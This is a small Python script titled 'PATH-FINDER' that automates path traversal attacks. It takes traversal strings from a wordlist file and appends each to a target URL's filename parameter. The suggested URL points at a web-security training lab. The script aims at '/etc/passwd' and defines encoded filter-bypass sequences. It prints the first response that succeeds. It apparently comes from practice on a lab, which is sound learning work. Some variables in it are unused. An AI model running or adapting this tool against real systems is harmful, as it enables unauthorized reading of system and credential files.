import requests
import time
import pyfiglet
import datetime
from os import system
from termcolor import colored
system('clear')
print('-'*60)
path= colored(pyfiglet.figlet_format("P A T H - F I N D E R",'starwars'), 'cyan')
for i in path:
    print(i, end='')
    time.sleep(.001)

print('-'*60)
date = datetime.datetime.now()
print("date", date.date())
print("time", date.time())
print('-'*60, "\n")
path = 'travesal.txt'
print("------------------------------------")

sub_list = open(path).read()
directories = sub_list.splitlines()
bypass = [
    "/",
    "../",
    r"..%252f",
    r"..%c0%af"
]
print("------------------------------------")
print('URL - https://0a4c00010325a23cc05f1c0000ab00b5.web-security-academy.net/image?filename=')
a = input("Enter URL:")
filenmae = "/etc/passwd"
print("\n")
content = "root:x:0"
for dir in directories:
    dir_enum = a + dir
    r = requests.get(dir_enum)
    if r.status_code == 200:
        print("------------------------------------")
        print("Directory:", dir_enum)
        print("------------------------------------")
        print(r.text)
        break
    else:
        pass
